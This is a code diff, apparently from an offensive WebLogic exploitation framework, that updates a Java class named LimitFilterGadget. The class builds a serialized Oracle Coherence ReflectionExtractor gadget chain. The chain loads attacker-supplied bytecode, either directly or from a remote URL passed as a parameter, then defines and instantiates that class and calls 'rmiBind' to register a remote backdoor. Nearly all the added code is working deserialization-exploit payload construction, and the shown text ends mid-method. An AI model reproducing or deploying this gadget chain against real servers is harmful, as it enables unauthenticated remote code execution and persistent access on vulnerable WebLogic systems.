@@ -1,18 +1,16 @@
 /*
- * Copyright  2020.  r4v3zn
- *
+ * Copyright (c) 2020. r4v3zn.
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
  * You may obtain a copy of the License at
  *
- *  http://www.apache.org/licenses/LICENSE-2.0
+ * http://www.apache.org/licenses/LICENSE-2.0
  *
  * Unless required by applicable law or agreed to in writing, software
  * distributed under the License is distributed on an "AS IS" BASIS,
  * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  * See the License for the specific language governing permissions and
  * limitations under the License.
- *
  */
 
 package com.weblogic.framework.gadget.impl;
@@ -20,7 +18,8 @@ package com.weblogic.framework.gadget.impl;
 import cn.hutool.core.io.FileUtil;
 import com.weblogic.framework.annotation.Authors;
 import com.weblogic.framework.annotation.Dependencies;
-import com.weblogic.framework.gadget.ObjectPayload;
+import com.weblogic.framework.entity.GadgetParam;
+import com.weblogic.framework.gadget.ObjectGadget;
 import org.mozilla.classfile.DefiningClassLoader;
 import javax.management.BadAttributeValueExpException;
 import java.io.*;
@@ -56,7 +55,7 @@ import static org.apache.commons.lang3.StringUtils.isBlank;
  */
 @Authors({Authors.R4V3ZN})
 @Dependencies({":weblogic:coherence", ":mozilla:javascript"})
-public class LimitFilterGadget implements ObjectPayload<Serializable> {
+public class LimitFilterGadget implements ObjectGadget<Serializable> {
     /**
      * 获取序列化 payload (Runtime)
      * @param command 执行的命令
@@ -121,6 +120,57 @@ public class LimitFilterGadget implements ObjectPayload<Serializable> {
             Object javassistNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
             Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                     new Object[]{className, codeByte});
+            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
+            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
+                    new Object[]{bootArgs[0]});
+            Array.set(valueExtractor, 0, getConstructor);
+            Array.set(valueExtractor, 1, newInstance);
+            Array.set(valueExtractor, 2, loadClass);
+            Array.set(valueExtractor, 3, javassistNewInstance);
+            Array.set(valueExtractor, 4, defineClass);
+            Array.set(valueExtractor, 5, defineClassNewInstance);
+            Array.set(valueExtractor, 6, rmiBind);
+            clazz = URLClassLoader.class;
+        }
+        return getObject(valueExtractor, clazz, urlClassLoader);
+    }
+
+    @Override
+    public Serializable getObject(GadgetParam param) throws Exception {
+        String className = param.getClassName();
+        URLClassLoader urlClassLoader = param.getUrlClassLoader();
+        byte[] bytes = param.getCodeByte();
+        String[] bootArgs = param.getBootArgs();
+        String classPath = bootArgs[1];
+        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
+        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
+        Class clazz = null;
+        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
+        if(isBlank(classPath)){
+            Object javascriptNewInstance = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
+            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
+                    new Object[]{className, bytes});
+            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
+            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
+                    new Object[]{bootArgs[0]});
+            Array.set(valueExtractor, 0, javascriptNewInstance);
+            Array.set(valueExtractor, 1, defineClass);
+            Array.set(valueExtractor, 2, defineClassNewInstance);
+            Array.set(valueExtractor, 3, rmiBind);
+            clazz = DefiningClassLoader.class;
+        }else{
+            URL url = new URL(classPath);
+            URL[] urls = new URL[]{url};
+            valueExtractor = Array.newInstance(valueExtractorClazz,7);
+            Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
+                    new Object[]{new Class[]{URL[].class}});
+            Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
+                    new Object[]{new Object[]{urls}});
+            Object loadClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
+                    new Object[]{"org.mozilla.classfile.DefiningClassLoader"});
+            Object javassistNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
+            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
+                    new Object[]{className, bytes});
             Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
             Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                     new Object[]{bootArgs[0]});
